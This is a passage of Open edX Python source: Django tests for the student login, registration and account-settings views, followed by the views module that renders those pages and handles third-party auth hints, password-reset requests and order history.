                response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        # Do NOT simulate a running pipeline
        else:
            response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")

        # This relies on the THIRD_PARTY_AUTH configuration in the test settings
        expected_providers = [
            {
                ""id"": ""oa2-dummy"",
                ""name"": ""Dummy"",
                ""iconClass"": None,
                ""iconImage"": settings.MEDIA_URL + ""icon.svg"",
                ""loginUrl"": self._third_party_login_url(""dummy"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""dummy"", ""register"", params)
            },
            {
                ""id"": ""oa2-facebook"",
                ""name"": ""Facebook"",
                ""iconClass"": ""fa-facebook"",
                ""iconImage"": None,
                ""loginUrl"": self._third_party_login_url(""facebook"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""facebook"", ""register"", params)
            },
            {
                ""id"": ""oa2-google-oauth2"",
                ""name"": ""Google"",
                ""iconClass"": ""fa-google-plus"",
                ""iconImage"": None,
                ""loginUrl"": self._third_party_login_url(""google-oauth2"", ""login"", params),
                ""registerUrl"": self._third_party_login_url(""google-oauth2"", ""register"", params)
            },
        ]
        self._assert_third_party_auth_data(
            response,
            current_backend,
            current_provider,
            expected_providers,
            expected_ec
        )

    def test_hinted_login(self):
        params = [(""next"", ""/courses/something/?tpa_hint=oa2-google-oauth2"")]
        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""oa2-google-oauth2""')

        tpa_hint = self.hidden_enabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""{0}""'.format(tpa_hint))

        tpa_hint = self.hidden_disabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")
        self.assertNotIn(response.content, tpa_hint)

    @ddt.data(
        ('signin_user', 'login'),
        ('register_user', 'register'),
    )
    @ddt.unpack
    def test_hinted_login_dialog_disabled(self, url_name, auth_entry):
        """"""Test that the dialog doesn't show up for hinted logins when disabled. """"""
        self.google_provider.skip_hinted_login_dialog = True
        self.google_provider.save()
        params = [(""next"", ""/courses/something/?tpa_hint=oa2-google-oauth2"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertRedirects(
            response,
            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),
            target_status_code=302
        )

    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))
    @ddt.data(
        'signin_user',
        'register_user',
    )
    def test_settings_tpa_hinted_login(self, url_name):
        """"""
        Ensure that settings.FEATURES['THIRD_PARTY_AUTH_HINT'] can set third_party_auth_hint.
        """"""
        params = [(""next"", ""/courses/something/"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""oa2-google-oauth2""')

        # THIRD_PARTY_AUTH_HINT can be overridden via the query string
        tpa_hint = self.hidden_enabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertContains(response, '""third_party_auth_hint"": ""{0}""'.format(tpa_hint))

        # Even disabled providers in the query string will override THIRD_PARTY_AUTH_HINT
        tpa_hint = self.hidden_disabled_provider.provider_id
        params = [(""next"", ""/courses/something/?tpa_hint={0}"".format(tpa_hint))]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertNotIn(response.content, tpa_hint)

    @override_settings(FEATURES=dict(settings.FEATURES, THIRD_PARTY_AUTH_HINT='oa2-google-oauth2'))
    @ddt.data(
        ('signin_user', 'login'),
        ('register_user', 'register'),
    )
    @ddt.unpack
    def test_settings_tpa_hinted_login_dialog_disabled(self, url_name, auth_entry):
        """"""Test that the dialog doesn't show up for hinted logins when disabled via settings.THIRD_PARTY_AUTH_HINT. """"""
        self.google_provider.skip_hinted_login_dialog = True
        self.google_provider.save()
        params = [(""next"", ""/courses/something/"")]
        response = self.client.get(reverse(url_name), params, HTTP_ACCEPT=""text/html"")
        self.assertRedirects(
            response,
            'auth/login/google-oauth2/?auth_entry={}&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2'.format(auth_entry),
            target_status_code=302
        )

    @mock.patch('student_account.views.enterprise_customer_for_request')
    @ddt.data(
        ('signin_user', False, None, None, None),
        ('register_user', False, None, None, None),
        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),
        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', u'{enterprise_name} - {platform_name}'),
        ('signin_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),
        ('register_user', True, 'Fake EC', None, u'{enterprise_name} - {platform_name}'),
        ('signin_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),
        ('register_user', True, 'Fake EC', 'http://logo.com/logo.jpg', None),
        ('signin_user', True, 'Fake EC', None, None),
        ('register_user', True, 'Fake EC', None, None),
    )
    @ddt.unpack
    def test_enterprise_register(self, url_name, ec_present, ec_name, logo_url, welcome_message, mock_get_ec):
        """"""
        Verify that when an EnterpriseCustomer is received on the login and register views,
        the appropriate sidebar is rendered.
        """"""
        if ec_present:
            mock_ec = mock_get_ec.return_value
            mock_ec.name = ec_name
            if logo_url:
                mock_ec.branding_configuration.logo.url = logo_url
            else:
                mock_ec.branding_configuration.logo = None
            if welcome_message:
                mock_ec.branding_configuration.welcome_message = welcome_message
            else:
                del mock_ec.branding_configuration.welcome_message
        else:
            mock_get_ec.return_value = None

        response = self.client.get(reverse(url_name), HTTP_ACCEPT=""text/html"")

        enterprise_sidebar_div_id = u'enterprise-content-container'

        if not ec_present:
            self.assertNotContains(response, text=enterprise_sidebar_div_id)
        else:
            self.assertContains(response, text=enterprise_sidebar_div_id)
            if not welcome_message:
                welcome_message = settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
            expected_message = welcome_message.format(
                start_bold=u'<b>',
                end_bold=u'</b>',
                enterprise_name=ec_name,
                platform_name=settings.PLATFORM_NAME
            )
            self.assertContains(response, expected_message)
            if logo_url:
                self.assertContains(response, logo_url)

    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)
    def test_microsite_uses_old_login_page(self):
        # Retrieve the login page from a microsite domain
        # and verify that we're served the old page.
        resp = self.client.get(
            reverse(""signin_user""),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertContains(resp, ""Log into your Test Site Account"")
        self.assertContains(resp, ""login-form"")

    def test_microsite_uses_old_register_page(self):
        # Retrieve the register page from a microsite domain
        # and verify that we're served the old page.
        resp = self.client.get(
            reverse(""register_user""),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertContains(resp, ""Register for Test Site"")
        self.assertContains(resp, ""register-form"")

    def test_login_registration_xframe_protected(self):
        resp = self.client.get(
            reverse(""register_user""),
            {},
            HTTP_REFERER=""http://localhost/iframe""
        )

        self.assertEqual(resp['X-Frame-Options'], 'DENY')

        self.configure_lti_provider(name='Test', lti_hostname='localhost', lti_consumer_key='test_key', enabled=True)

        resp = self.client.get(
            reverse(""register_user""),
            HTTP_REFERER=""http://localhost/iframe""
        )

        self.assertEqual(resp['X-Frame-Options'], 'ALLOW')

    def _assert_third_party_auth_data(self, response, current_backend, current_provider, providers, expected_ec):
        """"""Verify that third party auth info is rendered correctly in a DOM data attribute. """"""
        finish_auth_url = None
        if current_backend:
            finish_auth_url = reverse(""social:complete"", kwargs={""backend"": current_backend}) + ""?""

        auth_info = {
            ""currentProvider"": current_provider,
            ""providers"": providers,
            ""secondaryProviders"": [],
            ""finishAuthUrl"": finish_auth_url,
            ""errorMessage"": None,
        }
        if expected_ec is not None:
            # If we set an EnterpriseCustomer, third-party auth providers ought to be hidden.
            auth_info['providers'] = []
        auth_info = dump_js_escaped_json(auth_info)

        expected_data = '""third_party_auth"": {auth_info}'.format(
            auth_info=auth_info
        )

        self.assertContains(response, expected_data)

    def _third_party_login_url(self, backend_name, auth_entry, login_params):
        """"""Construct the login URL to start third party authentication. """"""
        return u""{url}?auth_entry={auth_entry}&{param_str}"".format(
            url=reverse(""social:begin"", kwargs={""backend"": backend_name}),
            auth_entry=auth_entry,
            param_str=self._finish_auth_url_param(login_params),
        )

    def _finish_auth_url_param(self, params):
        """"""
        Make the next=... URL parameter that indicates where the user should go next.

        >>> _finish_auth_url_param([('next', '/dashboard')])
        '/account/finish_auth?next=%2Fdashboard'
        """"""
        return urlencode({
            'next': '/account/finish_auth?{}'.format(urlencode(params))
        })

    def test_english_by_default(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"")

        self.assertEqual(response['Content-Language'], 'en')

    def test_unsupported_language(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""ts-zx"")

        self.assertEqual(response['Content-Language'], 'en')

    def test_browser_language(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""es"")

        self.assertEqual(response['Content-Language'], 'es-419')

    def test_browser_language_dialent(self):
        response = self.client.get(reverse('signin_user'), [], HTTP_ACCEPT=""text/html"", HTTP_ACCEPT_LANGUAGE=""es-es"")

        self.assertEqual(response['Content-Language'], 'es-es')


class AccountSettingsViewTest(ThirdPartyAuthTestMixin, TestCase, ProgramsApiConfigMixin):
    """""" Tests for the account settings view. """"""

    USERNAME = 'student'
    PASSWORD = 'password'
    FIELDS = [
        'country',
        'gender',
        'language',
        'level_of_education',
        'password',
        'year_of_birth',
        'preferred_language',
        'time_zone',
    ]

    @mock.patch(""django.conf.settings.MESSAGE_STORAGE"", 'django.contrib.messages.storage.cookie.CookieStorage')
    def setUp(self):
        super(AccountSettingsViewTest, self).setUp()
        self.user = UserFactory.create(username=self.USERNAME, password=self.PASSWORD)
        CommerceConfiguration.objects.create(cache_ttl=10, enabled=True)
        self.client.login(username=self.USERNAME, password=self.PASSWORD)

        self.request = HttpRequest()
        self.request.user = self.user

        # For these tests, two third party auth providers are enabled by default:
        self.configure_google_provider(enabled=True, visible=True)
        self.configure_facebook_provider(enabled=True, visible=True)

        # Python-social saves auth failure notifcations in Django messages.
        # See pipeline.get_duplicate_provider() for details.
        self.request.COOKIES = {}
        MessageMiddleware().process_request(self.request)
        messages.error(self.request, 'Facebook is already in use.', extra_tags='Auth facebook')

    def test_context(self):

        context = account_settings_context(self.request)

        user_accounts_api_url = reverse(""accounts_api"", kwargs={'username': self.user.username})
        self.assertEqual(context['user_accounts_api_url'], user_accounts_api_url)

        user_preferences_api_url = reverse('preferences_api', kwargs={'username': self.user.username})
        self.assertEqual(context['user_preferences_api_url'], user_preferences_api_url)

        for attribute in self.FIELDS:
            self.assertIn(attribute, context['fields'])

        self.assertEqual(
            context['user_accounts_api_url'], reverse(""accounts_api"", kwargs={'username': self.user.username})
        )
        self.assertEqual(
            context['user_preferences_api_url'], reverse('preferences_api', kwargs={'username': self.user.username})
        )

        self.assertEqual(context['duplicate_provider'], 'facebook')
        self.assertEqual(context['auth']['providers'][0]['name'], 'Facebook')
        self.assertEqual(context['auth']['providers'][1]['name'], 'Google')

    def test_view(self):
        """"""
        Test that all fields are  visible
        """"""
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        for attribute in self.FIELDS:
            self.assertIn(attribute, response.content)

    def test_header_with_programs_listing_enabled(self):
        """"""
        Verify that tabs header will be shown while program listing is enabled.
        """"""
        self.create_programs_config()
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        self.assertContains(response, '<li class=""tab-nav-item"">')

    def test_header_with_programs_listing_disabled(self):
        """"""
        Verify that nav header will be shown while program listing is disabled.
        """"""
        self.create_programs_config(enabled=False)
        view_path = reverse('account_settings')
        response = self.client.get(path=view_path)

        self.assertContains(response, '<li class=""item nav-global-01"">')

    def test_commerce_order_detail(self):
        """"""
        Verify that get_user_orders returns the correct order data.
        """"""
        with mock_get_orders():
            order_detail = get_user_orders(self.user)

        for i, order in enumerate(mock_get_orders.default_response['results']):
            expected = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': 'Jan 01, 2016',
                'receipt_url': '/checkout/receipt/?order_number=' + order['number'],
                'lines': order['lines'],
            }
            self.assertEqual(order_detail[i], expected)

    def test_commerce_order_detail_exception(self):
        with mock_get_orders(exception=exceptions.HttpNotFoundError):
            order_detail = get_user_orders(self.user)

        self.assertEqual(order_detail, [])

    def test_incomplete_order_detail(self):
        response = {
            'results': [
                factories.OrderFactory(
                    status='Incomplete',
                    lines=[
                        factories.OrderLineFactory(
                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory()])
                        )
                    ]
                )
            ]
        }
        with mock_get_orders(response=response):
            order_detail = get_user_orders(self.user)

        self.assertEqual(order_detail, [])

    def test_order_history_with_no_product(self):
        response = {
            'results': [
                factories.OrderFactory(
                    lines=[
                        factories.OrderLineFactory(
                            product=None
                        ),
                        factories.OrderLineFactory(
                            product=factories.ProductFactory(attribute_values=[factories.ProductAttributeFactory(
                                name='certificate_type',
                                value='verified'
                            )])
                        )
                    ]
                )
            ]
        }
        with mock_get_orders(response=response):
            order_detail = get_user_orders(self.user)

        self.assertEqual(len(order_detail), 1)


@override_settings(SITE_NAME=settings.MICROSITE_LOGISTRATION_HOSTNAME)
class MicrositeLogistrationTests(TestCase):
    """"""
    Test to validate that microsites can display the logistration page
    """"""

    def test_login_page(self):
        """"""
        Make sure that we get the expected logistration page on our specialized
        microsite
        """"""

        resp = self.client.get(
            reverse('signin_user'),
            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertIn('<div id=""login-and-registration-container""', resp.content)

    def test_registration_page(self):
        """"""
        Make sure that we get the expected logistration page on our specialized
        microsite
        """"""

        resp = self.client.get(
            reverse('register_user'),
            HTTP_HOST=settings.MICROSITE_LOGISTRATION_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertIn('<div id=""login-and-registration-container""', resp.content)

    @override_settings(SITE_NAME=settings.MICROSITE_TEST_HOSTNAME)
    def test_no_override(self):
        """"""
        Make sure we get the old style login/registration if we don't override
        """"""

        resp = self.client.get(
            reverse('signin_user'),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertNotIn('<div id=""login-and-registration-container""', resp.content)

        resp = self.client.get(
            reverse('register_user'),
            HTTP_HOST=settings.MICROSITE_TEST_HOSTNAME
        )
        self.assertEqual(resp.status_code, 200)

        self.assertNotIn('<div id=""login-and-registration-container""', resp.content)


class AccountCreationTestCaseWithSiteOverrides(SiteMixin, TestCase):
    """"""
    Test cases for Feature flag ALLOW_PUBLIC_ACCOUNT_CREATION which when
    turned off disables the account creation options in lms
    """"""

    def setUp(self):
        """"""Set up the tests""""""
        super(AccountCreationTestCaseWithSiteOverrides, self).setUp()

        # Set the feature flag ALLOW_PUBLIC_ACCOUNT_CREATION to False
        self.site_configuration_values = {
            'ALLOW_PUBLIC_ACCOUNT_CREATION': False
        }
        self.site_domain = 'testserver1.com'
        self.set_up_site(self.site_domain, self.site_configuration_values)

    def test_register_option_login_page(self):
        """"""
        Navigate to the login page and check the Register option is hidden when
        ALLOW_PUBLIC_ACCOUNT_CREATION flag is turned off
        """"""
        response = self.client.get(reverse('signin_user'))
        self.assertNotIn('<a class=""btn-neutral"" href=""/register?next=%2Fdashboard"">Register</a>',
                         response.content)
/n/n/nlms/djangoapps/student_account/views.py/n/n"""""" Views for a student's account information. """"""

import json
import logging
import urlparse
from datetime import datetime

import pytz
from django.conf import settings
from django.contrib import messages
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required
from django.core.urlresolvers import resolve, reverse
from django.http import HttpRequest, HttpResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.shortcuts import redirect
from django.utils.translation import ugettext as _
from django.views.decorators.csrf import ensure_csrf_cookie
from django.views.decorators.http import require_http_methods
from django_countries import countries

import third_party_auth
from commerce.models import CommerceConfiguration
from edxmako.shortcuts import render_to_response, render_to_string
from lms.djangoapps.commerce.utils import EcommerceService
from openedx.core.djangoapps.commerce.utils import ecommerce_api_client
from openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login
from openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register
from openedx.core.djangoapps.lang_pref.api import all_languages, released_languages
from openedx.core.djangoapps.programs.models import ProgramsApiConfig
from openedx.core.djangoapps.site_configuration import helpers as configuration_helpers
from openedx.core.djangoapps.theming.helpers import is_request_in_themed_site
from openedx.core.djangoapps.user_api.accounts.api import request_password_change
from openedx.core.djangoapps.user_api.errors import UserNotFound
from openedx.core.lib.edx_api_utils import get_edx_api_data
from openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES
from openedx.features.enterprise_support.api import enterprise_customer_for_request
from student.helpers import destroy_oauth_tokens, get_next_url_for_login_page
from student.models import UserProfile
from student.views import register_user as old_register_view
from student.views import signin_user as old_login_view
from third_party_auth import pipeline
from third_party_auth.decorators import xframe_allow_whitelisted
from util.bad_request_rate_limiter import BadRequestRateLimiter
from util.date_utils import strftime_localized

AUDIT_LOG = logging.getLogger(""audit"")
log = logging.getLogger(__name__)
User = get_user_model()  # pylint:disable=invalid-name


@require_http_methods(['GET'])
@ensure_csrf_cookie
@xframe_allow_whitelisted
def login_and_registration_form(request, initial_mode=""login""):
    """"""Render the combined login/registration form, defaulting to login

    This relies on the JS to asynchronously load the actual form from
    the user_api.

    Keyword Args:
        initial_mode (string): Either ""login"" or ""register"".

    """"""
    # Determine the URL to redirect to following login/registration/third_party_auth
    redirect_to = get_next_url_for_login_page(request)
    # If we're already logged in, redirect to the dashboard
    if request.user.is_authenticated():
        return redirect(redirect_to)

    # Retrieve the form descriptions from the user API
    form_descriptions = _get_form_descriptions(request)

    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.
    # If present, we display a login page focused on third-party auth with that provider.
    third_party_auth_hint = None
    if '?' in redirect_to:
        try:
            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)
            provider_id = next_args['tpa_hint'][0]
            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)
            if tpa_hint_provider:
                if tpa_hint_provider.skip_hinted_login_dialog:
                    # Forward the user directly to the provider's login URL when the provider is configured
                    # to skip the dialog.
                    if initial_mode == ""register"":
                        auth_entry = pipeline.AUTH_ENTRY_REGISTER
                    else:
                        auth_entry = pipeline.AUTH_ENTRY_LOGIN
                    return redirect(
                        pipeline.get_login_url(provider_id, auth_entry, redirect_url=redirect_to)
                    )
                third_party_auth_hint = provider_id
                initial_mode = ""hinted_login""
        except (KeyError, ValueError, IndexError) as ex:
            log.error(""Unknown tpa_hint provider: %s"", ex)

    # If this is a themed site, revert to the old login/registration pages.
    # We need to do this for now to support existing themes.
    # Themed sites can use the new logistration page by setting
    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their
    # configuration settings.
    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):
        if initial_mode == ""login"":
            return old_login_view(request)
        elif initial_mode == ""register"":
            return old_register_view(request)

    # Allow external auth to intercept and handle the request
    ext_auth_response = _external_auth_intercept(request, initial_mode)
    if ext_auth_response is not None:
        return ext_auth_response

    # Account activation message
    account_activation_messages = [
        {
            'message': message.message, 'tags': message.tags
        } for message in messages.get_messages(request) if 'account-activation' in message.tags
    ]

    # Otherwise, render the combined login/registration page
    context = {
        'data': {
            'login_redirect_url': redirect_to,
            'initial_mode': initial_mode,
            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),
            'third_party_auth_hint': third_party_auth_hint or '',
            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),
            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),
            'password_reset_support_link': configuration_helpers.get_value(
                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK
            ) or settings.SUPPORT_SITE_LINK,
            'account_activation_messages': account_activation_messages,

            # Include form descriptions retrieved from the user API.
            # We could have the JS client make these requests directly,
            # but we include them in the initial page load to avoid
            # the additional round-trip to the server.
            'login_form_desc': json.loads(form_descriptions['login']),
            'registration_form_desc': json.loads(form_descriptions['registration']),
            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),
            'account_creation_allowed': configuration_helpers.get_value(
                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))
        },
        'login_redirect_url': redirect_to,  # This gets added to the query string of the ""Sign In"" button in header
        'responsive': True,
        'allow_iframing': True,
        'disable_courseware_js': True,
        'combined_login_and_register': True,
        'disable_footer': not configuration_helpers.get_value(
            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',
            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']
        ),
    }

    context = update_context_for_enterprise(request, context)

    return render_to_response('student_account/login_and_register.html', context)


@require_http_methods(['POST'])
def password_change_request_handler(request):
    """"""Handle password change requests originating from the account page.

    Uses the Account API to email the user a link to the password reset page.

    Note:
        The next step in the password reset process (confirmation) is currently handled
        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's
        password reset confirmation view.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the email was sent successfully
        HttpResponse: 400 if there is no 'email' POST parameter
        HttpResponse: 403 if the client has been rate limited
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        POST /account/password

    """"""

    limiter = BadRequestRateLimiter()
    if limiter.is_rate_limit_exceeded(request):
        AUDIT_LOG.warning(""Password reset rate limit exceeded"")
        return HttpResponseForbidden()

    user = request.user
    # Prefer logged-in user's email
    email = user.email if user.is_authenticated() else request.POST.get('email')

    if email:
        try:
            request_password_change(email, request.is_secure())
            user = user if user.is_authenticated() else User.objects.get(email=email)
            destroy_oauth_tokens(user)
        except UserNotFound:
            AUDIT_LOG.info(""Invalid password reset attempt"")
            # Increment the rate limit counter
            limiter.tick_bad_request_counter(request)

        return HttpResponse(status=200)
    else:
        return HttpResponseBadRequest(_(""No email address provided.""))


def update_context_for_enterprise(request, context):
    """"""
    Take the processed context produced by the view, determine if it's relevant
    to a particular Enterprise Customer, and update it to include that customer's
    enterprise metadata.
    """"""

    context = context.copy()

    sidebar_context = enterprise_sidebar_context(request)

    if sidebar_context:
        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(
            context['data']['registration_form_desc']
        )
        context.update(sidebar_context)
        context['enable_enterprise_sidebar'] = True
        context['data']['hide_auth_warnings'] = True
    else:
        context['enable_enterprise_sidebar'] = False

    return context


def enterprise_fields_only(fields):
    """"""
    Take the received field definition, and exclude those fields that we don't want
    to require if the user is going to be a member of an Enterprise Customer.
    """"""
    enterprise_exclusions = configuration_helpers.get_value(
        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',
        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS
    )
    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]


def enterprise_sidebar_context(request):
    """"""
    Given the current request, render the HTML of a sidebar for the current
    logistration view that depicts Enterprise-related information.
    """"""
    enterprise_customer = enterprise_customer_for_request(request)

    if not enterprise_customer:
        return {}

    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)

    if enterprise_customer.branding_configuration.logo:
        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url
    else:
        enterprise_logo_url = ''

    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):
        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message
    else:
        branded_welcome_template = configuration_helpers.get_value(
            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',
            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE
        )

    branded_welcome_string = branded_welcome_template.format(
        start_bold=u'<b>',
        end_bold=u'</b>',
        enterprise_name=enterprise_customer.name,
        platform_name=platform_name
    )

    platform_welcome_template = configuration_helpers.get_value(
        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',
        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE
    )
    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)

    context = {
        'enterprise_name': enterprise_customer.name,
        'enterprise_logo_url': enterprise_logo_url,
        'enterprise_branded_welcome_string': branded_welcome_string,
        'platform_welcome_string': platform_welcome_string,
    }

    return context


def _third_party_auth_context(request, redirect_to, tpa_hint=None):
    """"""Context for third party auth providers and the currently running pipeline.

    Arguments:
        request (HttpRequest): The request, used to determine if a pipeline
            is currently running.
        redirect_to: The URL to send the user to following successful
            authentication.
        tpa_hint (string): An override flag that will return a matching provider
            as long as its configuration has been enabled

    Returns:
        dict

    """"""
    context = {
        ""currentProvider"": None,
        ""providers"": [],
        ""secondaryProviders"": [],
        ""finishAuthUrl"": None,
        ""errorMessage"": None,
    }

    if third_party_auth.is_enabled():
        if not enterprise_customer_for_request(request):
            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):
                info = {
                    ""id"": enabled.provider_id,
                    ""name"": enabled.name,
                    ""iconClass"": enabled.icon_class or None,
                    ""iconImage"": enabled.icon_image.url if enabled.icon_image else None,
                    ""loginUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_LOGIN,
                        redirect_url=redirect_to,
                    ),
                    ""registerUrl"": pipeline.get_login_url(
                        enabled.provider_id,
                        pipeline.AUTH_ENTRY_REGISTER,
                        redirect_url=redirect_to,
                    ),
                }
                context[""providers"" if not enabled.secondary else ""secondaryProviders""].append(info)

        running_pipeline = pipeline.get(request)
        if running_pipeline is not None:
            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)

            if current_provider is not None:
                context[""currentProvider""] = current_provider.name
                context[""finishAuthUrl""] = pipeline.get_complete_url(current_provider.backend_name)

                if current_provider.skip_registration_form:
                    # As a reliable way of ""skipping"" the registration form, we just submit it automatically
                    context[""autoSubmitRegForm""] = True

        # Check for any error messages we may want to display:
        for msg in messages.get_messages(request):
            if msg.extra_tags.split()[0] == ""social-auth"":
                # msg may or may not be translated. Try translating [again] in case we are able to:
                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string
                break

    return context


def _get_form_descriptions(request):
    """"""Retrieve form descriptions from the user API.

    Arguments:
        request (HttpRequest): The original request, used to retrieve session info.

    Returns:
        dict: Keys are 'login', 'registration', and 'password_reset';
            values are the JSON-serialized form descriptions.

    """"""
    return {
        'login': _local_server_get('/user_api/v1/account/login_session/', request.session),
        'registration': _local_server_get('/user_api/v1/account/registration/', request.session),
        'password_reset': _local_server_get('/user_api/v1/account/password_reset/', request.session)
    }


def _local_server_get(url, session):
    """"""Simulate a server-server GET request for an in-process API.

    Arguments:
        url (str): The URL of the request (excluding the protocol and domain)
        session (SessionStore): The session of the original request,
            used to get past the CSRF checks.

    Returns:
        str: The content of the response

    """"""
    # Since the user API is currently run in-process,
    # we simulate the server-server API call by constructing
    # our own request object.  We don't need to include much
    # information in the request except for the session
    # (to get past through CSRF validation)
    request = HttpRequest()
    request.method = ""GET""
    request.session = session

    # Call the Django view function, simulating
    # the server-server API call
    view, args, kwargs = resolve(url)
    response = view(request, *args, **kwargs)

    # Return the content of the response
    return response.content


def _external_auth_intercept(request, mode):
    """"""Allow external auth to intercept a login/registration request.

    Arguments:
        request (Request): The original request.
        mode (str): Either ""login"" or ""register""

    Returns:
        Response or None

    """"""
    if mode == ""login"":
        return external_auth_login(request)
    elif mode == ""register"":
        return external_auth_register(request)


def get_user_orders(user):
    """"""Given a user, get the detail of all the orders from the Ecommerce service.

    Args:
        user (User): The user to authenticate as when requesting ecommerce.

    Returns:
        list of dict, representing orders returned by the Ecommerce service.
    """"""
    no_data = []
    user_orders = []
    commerce_configuration = CommerceConfiguration.current()
    user_query = {'username': user.username}

    use_cache = commerce_configuration.is_cache_enabled
    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None
    api = ecommerce_api_client(user)
    commerce_user_orders = get_edx_api_data(
        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key
    )

    for order in commerce_user_orders:
        if order['status'].lower() == 'complete':
            date_placed = datetime.strptime(order['date_placed'], ""%Y-%m-%dT%H:%M:%SZ"")
            order_data = {
                'number': order['number'],
                'price': order['total_excl_tax'],
                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),
                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),
                'lines': order['lines'],
            }
            user_orders.append(order_data)

    return user_orders


@login_required
@require_http_methods(['GET'])
def account_settings(request):
    """"""Render the current user's account settings page.

    Args:
        request (HttpRequest)

    Returns:
        HttpResponse: 200 if the page was sent successfully
        HttpResponse: 302 if not logged in (redirect to login page)
        HttpResponse: 405 if using an unsupported HTTP method

    Example usage:

        GET /account/settings

    """"""
    return render_to_response('student_account/account_settings.html', account_settings_context(request))


@login_required
@require_http_methods(['GET'])
def finish_auth(request):  # pylint: disable=unused-argument
